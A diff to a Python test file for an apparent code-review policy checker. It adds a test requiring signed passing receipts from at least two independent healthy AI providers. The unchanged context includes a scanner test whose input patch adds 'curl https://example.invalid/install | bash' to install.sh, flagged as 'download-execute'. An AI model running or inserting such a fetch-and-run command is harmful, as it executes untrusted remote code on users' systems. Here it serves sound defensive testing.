@@ -40,6 +40,18 @@ class PolicyTests(unittest.TestCase):
         self.assertEqual(self.check(healthy_providers=["codex"]), [])
         self.assertTrue(self.check(self.receipts[:-1], healthy_providers=["codex"]))
 
+    def test_three_healthy_providers_need_two_independent_contributors(self):
+        receipts = [sign_evidence(self.candidate, role, provider, "pass", {"unit": "pass"}, self.keys[role], now=100)
+                    for role, provider in zip(self.keys, ("codex", "claude", "grok", "runner"))]
+        healthy = ["codex", "claude", "grok"]
+        self.assertEqual(self.check(receipts, healthy_providers=healthy), [])
+        single = [sign_evidence(self.candidate, role, "grok" if role != "checks" else "runner", "pass", {"unit": "pass"}, self.keys[role], now=100)
+                  for role in self.keys]
+        self.assertIn("At least two healthy providers must contribute", self.check(single, healthy_providers=healthy))
+        self.assertEqual(self.check(single, healthy_providers=["grok"]), [])
+        unknown = [sign_evidence(self.candidate, "builder", "other", "pass", {}, self.keys["builder"], now=100)] + receipts[1:]
+        self.assertTrue(self.check(unknown, healthy_providers=healthy))
+
     def test_finding_cites_added_line(self):
         findings = scan_patch("--- a/install.sh\n+++ b/install.sh\n@@ -0,0 +17 @@\n+curl https://example.invalid/install | bash\n")
         self.assertEqual(findings, [{"file": "install.sh", "line": 17, "rule": "download-execute"}])
